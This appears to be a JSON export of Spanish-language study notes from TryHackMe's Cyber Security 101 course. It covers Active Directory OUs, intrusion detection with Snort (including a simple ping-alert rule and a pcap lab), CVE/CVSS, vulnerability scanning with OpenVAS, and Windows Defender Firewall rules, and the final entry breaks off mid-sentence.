    "content": "Por defecto todas las máquinas que se unen a un dominio (excepto los DCs) son puestas en un contenedor llamado \"Computers\". Si comprobamos nuestro DC, veremos que ya hay algunas puestas allí:\n\n![[054.png]]\n\nAquí podemos ver todos los servidores, portátiles y PCs. Pero esto no es la mejor idea, puesto que querremos aplicarles políticas diferentes, seguramente. Aunque no hay un estándar para organizar las máquinas, podemos empezar separándolas en diferentes grupos:\n\n1. Estaciones de trabajo (workstations): Son uno de los objetos más comunes en el dominio del AD. Cada usuario en el dominio, seguramente tendrá la suya propia. Estos nunca deberían tener a un usuario privilegiado logueándose en ellas.\n2. Servidores: Son el segundo objeto más común. Son generalmente usados para dar servicios a usuarios u otros servidores.\n3. Domain Controllers: Son el tercer objeto más usado. Nos permiten manejar el AD. Estos son los más críticos, ya que pueden contener contraseñas hasheadas de todos los usuarios de la red.\n\nYa que estamos organizando nuestro AD, vamos a crear dos OUs separadas para `Workstations` y `Servers`. Los crearemos debajo de `thm.local`. Debería quedar así:\n\n![[055.png]]\n\nAhora moveremos los ordenadores personales y portátiles al OU de `Workstations` y los servidores al OU de `Servers`. Al hacer esto podremos configurar políticas más fácilmente."
  },
  {
    "title": "1. Windows Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/1-windows-fundamentals-1/1-windows-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/1. Windows Fundamentals 1/1. Windows Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 1. Windows Fundamentals 1",
    "content": "[[0. Windows Fundamentals 1]]"
  },
  {
    "title": "2. Windows Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/2-windows-fundamentals-2/2-windows-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/2. Windows Fundamentals 2/2. Windows Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 2. Windows Fundamentals 2",
    "content": "[[0. Windows Fundamentals 2]]"
  },
  {
    "title": "3. Windows Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/3-windows-fundamentals-3/3-windows-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows Fundamentals 3/3. Windows Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 3. Windows Fundamentals 3",
    "content": "[[0. Windows Fundamentals 3]]"
  },
  {
    "title": "0. IDS Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/0-ids-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/0. IDS Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "[[1. What is an IDS]]\n[[2. Types of IDS]]\n[[3. IDS Example - Snort]]\n[[4. Snort Usage]]\n[[5. Practical Lab]]\n"
  },
  {
    "title": "5. Practical Lab",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/5-practical-lab/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/5. Practical Lab.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "1. Vamos a donde nos dicen que está el archivo `.pcap`:\n   ![[Pasted image 20251025153857.png]]\n2. Usamos Snort para cargar el pcap:\n   ![[Pasted image 20251025154122.png]]\n3. Detectamos la IP de la máquina que accedió por SSH:\n   ![[Pasted image 20251025154246.png]]\n4. Buscamos la otra regla cumplida en el pcap:\n   ![[Pasted image 20251025154328.png]]\n5. Buscamos el SID de la regla que se dispara con la conexión SSH:\n   ![[Pasted image 20251025154430.png]]\n\n"
  },
  {
    "title": "4. Snort Usage",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/4-snort-usage/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/4. Snort Usage.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Durante la instalación de Snort, debes dar tu interfaz de red y rango. Puedes usarlo para capturar tráfico sólamente, pero si quieres usar Snort para capturar y detectar intrusiones en toda tu red, debes activar el modo promiscuo en la interfaz de red de tu host.\n\nSnort tiene pre-instaladas algunos archivos de reglas, un archivo de configuración y otros archivos. Estos son guardados en `/etc/snort`. El archivo clave para Snort es el archivo de configuración `snort.conf`. Las reglas se guardan en el fichero `rules`. Si usamos `ls` para listar todos los archivos y ficheros en el directorio de Snort:\n\n```shell\nubuntu@tryhackme:~$ ls /etc/snort\nclassification.config  reference.config  snort.debian.conf\ncommunity-sid-msg.map  rules             threshold.conf\ngen-msg.map            snort.conf        unicode.map\n```\n\n-----------------------------\n<h2>Formato de las Reglas</h2>\nVeamos ahora cómo se crean las reglas en Snort. Hay una manera muy específica de escribir reglas. Esta es una regla de ejemplo que detecta paquetes ICMP viniente de cualquier dirección y puerto y alcanzando la red local en cualquier puerto. Una vez se detecta ese tráfico se lanza una alerta de \"Ping Detected\".\n\n![[Pasted image 20251025114149.png]]\n\n- **Action:** Especifica qué acción tomar cuando la regla se dispara.\n- **Protocol:** Se refiere al protocolo que coincide con la regla.\n- **Source IP:** Determina la IP de la que proviene el tráfico.\n- **Source Port:** Determina el puerto desde el que sale el tráfico.\n- **Destination IP:** Especifica la dirección IP de destino. En este ejemplo hemos usado `$HOME_NET` que es una variable que hemos definido en el archivo de configuración de Snort.\n- **Destination Port:** Determina el puerto de destino.\n- **Rule metadata:** Cada regla tiene ciertos metadatos que se definen al final de la regla entre paréntesis. Sus componentes son:\n\t- **Message (msg):** Describe el mensaje mostrado cuando la regla se dispara.\n\t- **Signature ID (sid):** Cada regla tiene un identificador único. Lo configuramos nosotros, por lo que debemos llevar un recuento.\n\t- **Rule revision (rev):** Configura el número de revisión de la regla. Cada vez que la regla sea modificada, el número de revisión incrementa, lo que ayuda a llevar un control de cuándo se cambia.\n\n------------------------------\n<h2>Creación de Reglas</h2>\nCopiaremos la regla anterior (`alert icmp any any -> 127.0.0.1 any (msg:\"Loopback Ping Detected\"; sid:10003; rev:1;)`) en el archivo `/etc/snort/rules/local.rules`.\n\n----------------------------\n<h2>Comprobación de Reglas</h2>\nPrimero, arrancaremos la herramienta Snort para detectar cualquier intrusión. Para esto tenemos que ejecutar el siguiente comando:\n\n`ubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf`\n\n>[!CAUTION] Reemplaza `lo` por el nombre que tenga tu interfaz de `loopback`.\n\nComo esta regla está diseñada para evitar los pings en nuestra interfaz loopback, trataremos de hacernos ping en `127.0.0.1`.\n\n```shell\nubuntu@tryhackme:~$ ping 127.0.0.1\n```\n\nLo de abajo muestra la alerta de \"Loopback Ping Detected\" cuando pingueamos nuestra interfaz loopback. Esto significa que nuestra regla está funcionando como debe.\n\n```shell\nubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf\n07/24-10:46:52.401504  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n07/24-10:46:53.406552  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n07/24-10:46:54.410544  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n```\n\n---------------------------------\n<h2>Corriendo Snort en Archivos PCAP</h2>\nA veces necesitaremos investigar un archivo de registro de tráfico de red. Para realizar este tipo de escaneo con Snort, podemos usar:\n\n```shell\nubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf\n```\n"
  },
  {
    "title": "2. Types of IDS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/2-types-of-ids/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/2. Types of IDS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Los IDSs se pueden categorizar diferentemente dependiendo de ciertos factores. Su categorización principal depende de su modo de detección y su despliegue.\n\n-----------------------\n<h2>Modos de Despliegue</h2>\nUn IDS puede ser desplegado de las siguientes maneras:\n\n- **Host Intrusion Detection System (HIDS):** Se instalan individualmente en los hosts y son responsables de detectar amenazas de seguridad potenciales asociadas a un host particular. Ofrecen visibilidad detallada de las actividades del host. Sin embargo pueden ser complicados de manejar en redes grandes.\n- **Network Intrusion Detection System (NIDS):** Son esenciales en detectar actividad maliciosa en la red entera sin importar un host en específico. Monitorizan el tráfico de red de todos los hosts involucrados para detectar actividad maliciosa. Ofrece una vista centralizada de todas las detecciones dentro de la red.\n\n![[Pasted image 20251024210018.png]]\n\n--------------------------------\n<h2>Modos de Detección</h2>\n- **Signature-based IDS:** Cada ataque tiene un patrón único, que se conoce como firma. Estas son preservadas por los IDSs en sus bases de datos para que si el mismo ataque vuelve a ocurrir, se detecte y se frene a tiempo. Cuanto más extensa sea la base de datos del IDS, más fuerte es este método. No puede detectar ataque Zero-Day (que son los ataques que no tienen firmas previas).\n- **Anomaly-based IDS:** Este tipo de IDS primero aprende el comportamiento normal (baseline) de la red o sistema y realiza detecciones si hay alguna desviación del comportamiento normal. Los IDSs basados en anomalías también pueden detectar ataques Zero-Day porque no dependen de firmas. Sin embargo, este tipo de IDS puede generar un alto número de falsos positivos. \n- **Hybrid IDS:** Un IDS híbrido combina la detección mediante firmas y la basada en anomalías. Si la amenaza ya es conocida usará el sistema basado en firmas mientras que si no lo es, pivotará al basado en anomalías.\n\nLos IDSs basados en firmas pueden detectar amenazas rápidamente. Sin embargo, para redes más grandes, los basados en anomalías o los híbridos pueden detectar ataques modernos con exploits zeroday."
  },
  {
    "title": "3. IDS Example - Snort",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/3-ids-example-snort/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/3. IDS Example - Snort.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Snort es uno de los IDSs de código abierto más usados, desarrollado en 1998. Usa un sistema híbrido de IDS. Trae pre-instalados varios archivos de configuración de reglas. Estos son una variedad de patrones de ataque conocidos. Además, puedes configurar tus propias reglas. También puedes deshabilitar cualquier regla predefinida.\n\n-----------------------------\n<h2>Modos de Snort</h2>\n![[Pasted image 20251024214032.png]]\n\n| Modo                                    | Descripción                                                                                                                                                                                                                           |\n| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Packet sniffer mode                     | Este modo lee y muestra los paquetes de red sin realizar ningún análisis en ellos. El modo de esnifeo de paquetes puede ser útil cuando los analistas necesitan leer los paquetes de tráfico sin realizar ninguna acción sobre ellos. |\n| Packet logging mode                     | A veces es necesario guardar el tráfico de red para su posterior análisis. Este modo te permite guardar el tráfico como un archivo PCAP. Los investigadores forenses investigan los logs.                                             |\n| Network Intrusion Detection System mode | Es su modo principal que monitoriza el tráfico de red en tiempo real y aplica sus archivos de reglas para identificar cualquier coincidencia.                                                                                         |\n"
  },
  {
    "title": "1. What is an IDS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/1-what-is-an-ids/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/1. What is an IDS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Como ya sabemos, los firewalls son la solución de seguridad más comúnmente desplegada en la frontera de una red para proteger el tráfico entrante y saliente. Sien embargo, también debería haber seguridad dentro de la red, para detectar la actividad posiblemente maliciosa de aquellos atacantes que hayan conseguido sobrepasar el firewall. Es para este propósito que usamos los **IDS** (Intrusion Detection System).\n\nPiensa en el ejemplo del edificio otra vez. El firewall es el guardia de la puerta mientras que el IDS juega el rol de las cámaras de seguridad internas. El IDS no realiza ninguna operación con esas detecciones, sólo informa a los administradores de seguridad.\n\n-------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Tipos de IDS y sus capabilidades de detección.\n- Funcionamiento del IDS Snort.\n- Reglas personalizadas y por defecto de Snort.\n- Hacer reglas personalizadas para Snort.\n\n---------------------------\n<h2>Pre-requisitos</h2>\n[[0. Firewall Fundamentals]]\n[[0. Networking Concepts]]\n"
  },
  {
    "title": "4. CVE & CVSS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/4-cve-cvss/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/4. CVE & CVSS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Imagínate como una persona sentada en el despacho de help desk de una oficina de IT gestionando a varios clientes. Lidias con cientos de quejas a diario respecto a varios problemas. Veamos cómo los CVE y los CVSS pueden ayudarte a llevar un control de estas quejas y preguntas.\n\n----------------------------------\n<h2>CVE</h2>\nCVE significa Common Vulnerabilities and Exposures. Es un número único para cada una de las quejas y preguntas. Si hay alguna actualización a un problema, puedes seguirlo fácilmente usando el número CVE único. Saliendo del ejemplo, el CVE es un número único dado a una vulnerabilidad. Fue desarrollado por la corporación MITRE. Cuando se encuentra una nueva vulnerabilidad, se le da un identificador CVE único como referencia y se publica en la base de datos online de CVE. Esta publicación apunta a hacer a las personas conocedoras de ellas para que las resuelvan.\n\n![[Pasted image 20251025173245.png]]\n- **Prefijo CVE:** Cada número tiene el prefijo CVE al principio.\n- **Año:** En el medio aparece el año en el que se descubrió la vulnerabilidad.\n- **Dígitos arbitrarios:** La última parte del número CVE contiene 4 o más dígitos arbitrarios.\n\n-----------------------------\n<h2>CVSS</h2>\nCVSS significa Common Vulnerability Scoring System. Si volvemos al ejemplo del help desk, siempre necesitaríamos priorizar las quejas. La forma más eficiente es por nivel de severidad. Si todas se registran con un nivel entre 0 y 10, donde 0 es el riesgo menor y 10 el mayor, se vuelve más fácil decidir qué quejas atender primero. Este número se calcula atendiendo a múltiples factores como el impacto, la facilidad de la explotación, etc.\n\n|CVSS Score Range|Severity Levels|\n|---|---|\n|0.0-3.9|Low|\n|4.0-6.9|Medium|\n|7.0-8.9|High|\n|9.0-10|Critical|\n"
  },
  {
    "title": "5. OpenVAS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/5-openvas/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/5. OpenVAS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Como ya hemos visto, OpenVAS es un escáner de vulnerabilidades de código abierto. En esta tarea veremos cómo realizar un escaneo de vulnerabilidades con él.\n\n-------------------------\n<h2>Instalación</h2>\nUsaremos docker para instalar OpenVAS. Docker es una plataforma que nos ayuda a crear y distribuir paquetes de diferentes aplicaciones. Estos paquetes se conocen como containers. El container de una aplicación tiene todas las dependencias ya instaladas dentro, por lo que no necesitamos pasar más tiempo instalándolas.\n\n```shell\nsudo apt install docker.io\n```\n\nDespués de instalar docker en nuestra máquina, podemos proceder a instalar OpenVAS en un contenedor docker. Por simplicidad usaremos la imagen de docker proporcionada por [Immauss](https://immauss.github.io/openvas/) ya que encaja todo en una sóla imagen docker. Para instalar OpenVAS con todas las dependencias instaladas usaremos:\n\n```shell\nsudo docker run -d -p 443:443 --name openvas immauss/openvas\n```\n\n----------------------------\n<h2>Acceder a OpenVAS</h2>\nUna vez completada la instalación, podemos acceder a la interfaz web de OpenVAS escribiendo en el navegador `https://127.0.0.1`.\n\nEsto nos llevará a la página de login de OpenVAS. Una vez que introduzcamos las credenciales correctas se abrirá el siguiente dashboard:\n\n![[Pasted image 20251025194317.png]]\n\n---------------------\n<h2>Realizar un Escaneo de Vulnerabilidades</h2>\nAhora vamos a proceder a realizar un escaneo de vulnerabilidades en la máquina. El primer paso es crear una tarea dentro de la dashboard de OpenVAS. Rellenaremos los detalle de esta tarea y la ejecutaremos para empezar el escaneo.\n\nHacemos click en `Tasks` dentro de la opción `Scans`:\n\nLlegaremos a la página donde están todas las tareas corriendo. No veremos ninguna tarea todavía porque no hemos desplegado ninguna. Para crear una tarea, hacemos click en el icono de la estrella, luego en `New Task`:\n\n![[Pasted image 20251025194620.png]]\n\nIntroduce el nombre de la tarea y haz click en `Scan Targets`:\n\n![[Pasted image 20251025194803.png]]\n\nIntroduce el nombre de la máquina objetivo y su dirección IP y haz click en `Create`:\n\n![[Pasted image 20251025194859.png]]\n\nTendrás múltiples opciones de escaneo disponibles. Cada opción tiene su alcance de escaneo. Puedes estudiar los detalles de cada tipo y elegir acordemente. Después haz click en `Create`:\n\n![[Pasted image 20251025195023.png]]\n\nLa tarea se creará y será mostrada en la dashboard \"Tasks\". Para iniciar el escaneo haz click en el botón `play` de la opción `Actions` de la pestaña:\n\n![[Pasted image 20251025195137.png]]\n\nTomará unos minutos completar el escaneo. Después de que se haya terminado, verás el estado marcado como `Done`. Las visualizaciones dentro del dashboard de tareas mostrarán algunos números indicando la severidad de las vulnerabilidades encontradas. Para comprobar los detalles debes hacer click en el nombre de la tarea:\n\n![[Pasted image 20251025195333.png]]\n\nPara ver los detalles de todas las vulnerabilidades encontradas durante el escaneo, puedes hacer click en el número indicando la cuenta de vulnerabilidades encontradas en el host.\n\n![[Pasted image 20251025195441.png]]\n\nAhora que tenemos la lista de todas las vulnerabilidades encontradas en esta máquina y su severidad, podemos hacer click en cualquiera de ellas para ver más detalles:\n\n![[Pasted image 20251025195629.png]]\n\nAl igual que otros escáneres de vulnerabilidades, OpenVAS nos permite exportar los resultados como reporte. Podemos extraer los reportes en cualquier formato desde la dashboard \"Tasks\".\n\n"
  },
  {
    "title": "2. Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/2-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/2. Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "El escaneo de vulnerabilidades es la inspección de sistemas digitales para encontrar debilidades. Las organizaciones llevan información crítica en su infraestructura. Deben escanear sus sistemas y redes regularmente en busca de vulnerabilidades, ya que los atacantes pueden usarlas para comprometer su infraestructura digital. Algunos estándares recomiendan realizar ecaneos cada 3 meses mientras que otros anualmente.\n\nVimos cómo de importante era realizar escaneos de vulnerabilidad regularmente. Sin embargo, buscarlas manualmente, pude ser muy cansado y podemos dejarnos muchas importantes. Para esto tenemos escáneres de vulnerabilidades automatizados.\n\nDespués de identificar las vulnerabilidades, las organizaciones las arreglan haciendo cambios en el software o sistema. Estos cambios son los parches o patches.\n\n--------------------------------\n<h2>Escaneos Autentificados vs. No Autentificados</h2>\nLos escaneos autentificados requieren las credenciales del host en cuestión y son más detallados que los no autentificados. Estos tipos de escaneos son útiles para descubrir vectores de ataque dentro del host mientras que aquellos en los que no se requieren credenciales son útiles para descubrir los vectores de ataque fuera del host.\n\n| Escaneo Autentificado                                                                             | Escaneo No Autentificado                                                                         |\n| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |\n| Se necesitan las credenciales del host en cuestión.                                               | No se necesitan las credenciales del host.                                                       |\n| Identifican las vulnerabilidades que los atacantes que tienen acceso al host pueden explotar.     | Identifican las vulnerabilidades que los atacantes que no tienen acceso al host pueden explotar. |\n| Ofrece una visibilidad mñas profunda sobre el sistema escaneando su configuración y aplicaciones. | Más sencillo de configurar y consume menos recursos.                                             |\n| Por ejemplo, escanear una base de datos interna dando las credenciales para el escaneo.           | Por ejemplo, escanear una web de cara al público en busca de vulnerabilidades.                   |\n\n---------------------------\n<h2>Escaneos Internos vs. Externos</h2>\nLos escaneos internos se realizan desde dentro de la red, mientras que los escaneos externos se realizan desde fuera de la red.\n\n| Escaneo Interno                                                                        | Escaneo Externo                                                                           |\n| -------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |\n| Realizados desde dentro de la red.                                                     | Realizados desde fuera de la red.                                                         |\n| Se centra en las vulnerabilidades que pueden ser explotadas desde dentro de la red.    | Se centra en las vulnerabilidades que pueden ser explotadas desde fuera de la red.        |\n| Identifica vulnerabilidades que estarían expuestas a los atacantes al entrar a la red. | Identifica vulnerabilidades que estarían expuestas a los atacantes desde fuera de la red. |\n"
  },
  {
    "title": "3. Tools for Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/3-tools-for-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/3. Tools for Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Hay muchas herramientas disponibles para realizar escaneos automatizados de vulnerabilidades, cada una ofreciendo diferentes funcionalidades.\n\n---------------------------\n<h2>Nesus</h2>\n[Nesus](https://www.tenable.com/products/nessus) fue desarrollado como un proyecto de código abierto en 1998. Adquirido por Tenable en 2005 se volvió software de propiedad. Tiene una extensa lista de opciones de escaneo y es muy usado entre las empresas. Disponible en versiones gratuita y de pago. Aunque la gratuita tiene funciones limitadas.\n\n--------------------------\n<h2>Qualys</h2>\n[Qualys](https://www.qualys.com/) se desarrolló en 1999 como una solución de escaneo de vulnerabilidades basada en suscripción. Junto con escaneos continuos, ofrece comprobaciones de cumplimiento de normativa y manejo de activos. Alerta de forma automática las vulnerabilidades encontradas durante la monitorización continua. Lo mejor de esta herramienta es que es una plataforma basada en cloud, lo que significa que no tiene coste extra para mantenerla activa en nuestro hardware y manejarla.\n\n--------------------------\n<h2>Nexpose</h2>\n[Nexpose](https://www.rapid7.com/products/nexpose/) fue desarrollado por Rapid7 en 2005 como una solución de manejo de vulnerabilidades de suscripción. Descubre continuamente nuevos activos en la red y realiza escaneos de vulnerabilidades sobre ellos. Da una puntuación de riesgo de la vulnerabilidad dependiendo en el valor del activo y el impacto de la vulnerabilidad. También ofrece comprobaciones de cumplimiento de normativa con varios estándares. Ofrece métodos de despliegue en cloud y en local.\n\n----------------------------\n<h2>OpenVAS (Open Vulnerability Assessment System)</h2>\n[OpenVAS](https://www.openvas.org/) es una solución de escaneo de vulnerabilidades de código abierto desarrollado por Greenbone Security. Ofrece funcionalidades básicas con vulnerabilidades conocidas escaneadas a través de su base de datos. Es menos cara que las herramientas comerciales. Sin embargo, te da el sabor de un escáner de vulnerabilidades completo. Es beneficial para organizaciones pequeñas y equipos individuales.\n"
  },
  {
    "title": "0. Vulnerability Scanner Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/0-vulnerability-scanner-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/0. Vulnerability Scanner Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "[[1. What Are Vulnerabilities?]]\n[[2. Vulnerability Scanning]]\n[[3. Tools for Vulnerability Scanning]]\n[[4. CVE & CVSS]]\n[[5. OpenVAS]]\n"
  },
  {
    "title": "1. What Are Vulnerabilities?",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/1-what-are-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/1. What Are Vulnerabilities?.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
    "content": "Imagina que vives en una casita encantadora. Un día observas que hay múltiples agujeritos en tu techo. SI no lo solucionas, eventualmente estos pequeños agujeros podrían causar graves problemas. Durante la lluvia se puede filtrar agua, insectos y suciedad puede entrar, etc. Estos agujeros son debilidades de tu casa y pueden causar problemas si no se tratan adecuadamente. Estas debilidades se conocen como vulnerabilidades. El proceso de arreglar estas vulnerabilidades se conoce como parchear.\n\nEn los dispositivos digitales estas debilidades a las que llamamos vulnerabilidades pueden estar en el software o el hardware y un atacante podría usarlas para ganar acceso a nuestra máquina. El problema de estas vulnerabilidades es que son más difíciles de detectar que unos agujeros en el techo. Los atacantes siempre están en su búsqueda, por lo que los defensores también deben hacerlo para poder parchearlas.\n\n------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Escaneos de vulnerabilidades y sus tipos.\n- Herramientas usadas para el escaneo de vulnerabilidades.\n- Demostración de escáner de vulnerabilidades OpenVAS.\n- Ejercicio práctico.\n\n"
  },
  {
    "title": "4. Windows Defender Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/4-windows-defender-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/4. Windows Defender Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "<h2>Windows Defender Firewall</h2>\nEs un firewall integrado en Windows OS. Este contiene todas las funcionalidades básicas para crear reglas que permitan o denieguen el tráfico y aplicaciones. Para abrir este firewall debes ir a la barra de búsqueda de Windows y escribir \"Windows Defender Firewall\". \n\nLa página de entrada de WDF muestra los perfiles de red y las opciones disponibles:\n\n![[Pasted image 20251024155230.png]]\n\n----------------------------\n<h2>Network Profiles</h2>\nHay dos perfiles de red disponibles. El firewall de Windows determina tu actual red basado en la NLA (Network Location Address) y te aplica ese perfil de red. Podemos tener diferentes configuraciones para cada uno de ellos.\n\n1. **Redes privadas:** Incluye configuraciones del firewall que aplicar cuando nos conectemos a una red privada, como la de nuestra casa.\n2. **Redes públicas:** Incluye configuraciones del firewall que aplicar cuando nos conectemos a una red pública, como una cafetería, restaurantes, etc.\n\nPara permitir/denegar alguna aplicación en nuestros perfiles de red, hacemos click en la opción remarcada con un 1. Esto nos llevará a la página que lista todas las apps instaladas en nuestro sistema. Podemos marcar aquellas que queramos permitir. WDF está activado por defecto, pero si lo queremos apagar, podemos hacer click en la opción marcada con un 2. Esto nos llevará a los ajustes de ambos perfiles de red. También puedes hacer click en el 3 \"Restore Defaults\" para volver a los valores por defecto.\n\n![[Pasted image 20251024161249.png]]\n\n-------------------------\n<h2>Custom Rules</h2>\nWDF también te permite crear reglas personalizadas para tu red. Creemos una para bloquear todo el tráfico saliente en el puerto 80 (HTTP) o 443 (HTTPS).\n\nAntes de crear esta regla comprobamos si podemos acceder a un sitio web:\n\n![[Pasted image 20251024161452.png]]\n\nPara crear esta regla elegimos \"Configuración Avanzada\" de las opciones disponibles en la dashboard. Esto abrirá una pestaña nueva.\n\n![[Pasted image 20251024161638.png]]\n\nAhí podemos ver las opciones disponibles:\n\n![[Pasted image 20251024161656.png]]\n\nCrearemos una regla para bloquear todo el tráfico HTTP/S saliente. Para esto, hacemos click en \"Outbound Rules\" a la izquierda, después en \"New Rule\". Se abrirá el configurador de reglas. Seleccionamos \"Custom\" y siguiente.\n\n![[Pasted image 20251024162515.png]]\n\nEn el segundo paso, seleccionamos \"All programs\". Te pedirá el protocolo , seleccionamos TCP, mantenemos el puerto local como está y cambiamos el puerto remoto a \"Specific ports\". Escribimos los números de los puertos (en nuestro caso 80 y 443). Le damos click a next.\n\n>[!NOTE] Separa los puertos con comas sin espacios (ej: 80,443).\n\n![[Pasted image 20251024164150.png]]\n\nEn la pestaña de alcance (scope), mantén las direcciones IP remotas y locales tal y como están. En la pestaña de acción, habilita la opción \"Block the connection\" y presiona next.\n\n![[Pasted image 20251024164409.png]]\n\nEn la pestaña de perfil mantenemos todos los perfiles de red marcados. Por último, la fase final es darle un nombre a la regla y una descripción opcional y presionar **Finish**.\n\nPodemos ver que nuestra regla se ha configurado:\n\n![[Pasted image 20251024164540.png]]\n\nSi ahora comprobamos la regla vemos que no podemos acceder a ningún servidor web por puerto 80 o 443:\n\n![[Pasted image 20251024164615.png]]\n\n---------------------------\n<h2>Exercise</h2>\nEl equipo de seguridad notó tráfico entrante y saliente sospechoso en sus sistemas Windows críticos. Crearon reglas en su WDF para bloquear algunos en específico. Se te pide 